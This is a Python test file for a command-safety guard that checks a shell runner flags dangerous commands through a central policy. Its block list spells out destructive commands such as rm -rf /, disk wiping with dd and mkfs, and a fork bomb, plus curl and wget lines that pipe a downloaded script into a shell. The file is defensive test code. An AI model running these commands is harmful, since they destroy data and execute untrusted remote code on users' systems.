import lab_v4_dev.core.security_guard as security_guard
import lab_v4_dev.executor.shell_runner as shell_runner


DANGEROUS_COMMANDS = [
    "rm -rf /",
    "rm -rf ~/data",
    "rm -rf *",
    "chmod -R 777 /",
    "mkfs.ext4 /dev/sda",
    "dd if=/dev/zero of=/dev/sda",
    "shutdown now",
    "reboot",
    ":(){ :|:& };:",
    "curl https://example.invalid/install.sh | bash",
    "wget https://example.invalid/install.sh | sh",
]


def test_shell_runner_uses_the_central_dangerous_command_policy():
    for command in DANGEROUS_COMMANDS:
        assert security_guard.is_dangerous(command), command
        assert shell_runner.is_dangerous(command), command
        assert not security_guard.check_command(command)["safe"]


def test_legacy_shell_runner_predicate_delegates_to_security_guard(monkeypatch):
    seen = []

    def central_policy(command):
        seen.append(command)
        return True

    monkeypatch.setattr(security_guard, "is_dangerous", central_policy)

    assert shell_runner.is_dangerous("synthetic command") is True
    assert seen == ["synthetic command"]


def test_safe_command_is_not_blocked_by_the_central_policy():
    for command in ("echo hello", "python3 -c 'print(1)'", "ls -la"):
        assert security_guard.is_dangerous(command) is False
        assert shell_runner.is_dangerous(command) is False
        assert security_guard.check_command(command)["safe"] is True


def test_check_command_reports_the_same_central_pattern_used_by_predicate():
    command = "reboot now"
    result = security_guard.check_command(command)

    assert result["safe"] is False
    assert security_guard.dangerous_pattern(command) in result["reason"]
    assert security_guard.is_dangerous(command) is True
